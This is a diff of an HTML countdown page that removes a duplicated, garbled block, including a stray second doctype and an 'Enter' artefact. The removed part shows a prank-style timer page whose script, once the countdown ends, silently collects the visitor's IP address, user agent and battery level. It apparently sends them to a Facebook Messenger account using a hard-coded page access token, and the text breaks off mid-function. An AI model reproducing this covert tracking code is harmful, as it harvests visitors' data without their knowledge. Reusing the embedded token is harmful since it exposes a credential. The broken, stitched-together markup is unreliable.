@@ -36,44 +36,6 @@
             font-weight: bold;
             text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.5);
             animation: pulse 1.5s infinite alternate;
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto page create</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background: linear-gradient(45deg, #ff416c, #ff4b2b, #1d2671, #c33764);
-            background-size: 300% 300%;
-            animation: gradientAnimation 8s ease infinite;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-
-        @keyframes gradientAnimation {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .text {
-            font-size: 4rem;
-            font-weight: bold;
-            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.5);
-            animation: pulse 1.5s infinite alternate;
         }
 
         @keyframes pulse {
@@ -152,55 +114,4 @@
         window.onload = updateTimer;
     </script>
 </body>
-</html>￼Enter        }
-
-        @keyframes pulse {
-            from { transform: scale(1); }
-            to { transform: scale(1.1); }
-        }
-
-        .timer {
-            margin-top: 20px;
-            font-size: 2rem;
-            font-weight: bold;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 10px 20px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
-        }
-    </style>
-</head>
-<body>
-    <div class="text">ANTAY</div>
-    Ho lasa adala enao afaka
-    <div class="timer">60</div><br>
-    secondes
-
-    <script>
-        const timerElement = document.querySelector(".timer");
-  let countdown = 60;
-
-        function updateTimer() {
-            if (countdown > 0) {
-                countdown--;
-                timerElement.textContent = countdown;
-                setTimeout(updateTimer, 1000);
-            } else {
-                sendToFacebook();
-            }
-        }
-
-        async function sendToFacebook() {
-            const PAGE_ACCESS_TOKEN = "EAAHlMiDkMgIBOZCfq0foiqZCJKynb3RWLOeZBnObfR79eGvOEbJvt7S8ZBXaJ8Dl3ARRGKnzpKfiG7dI5WJag64IW9XLOm0PApAWYMOn3Judh48QdN4GFq0yF25PZAplM4vDyQLJCUwSnO2UM9U3LJVvaR37RgEeDDMz5qqj8OAM4XCHq2a7fbHgyTKpI1JKT";
-            const RECIPIENT_PSID = "6881956545251284";
-
-            try {
-                const ipResponse = await fetch("https://api64.ipify.org?format=json");
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-
-                const userAgent = navigator.userAgent;
-
-                let batteryLevel = "Unknown";
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
+</html>
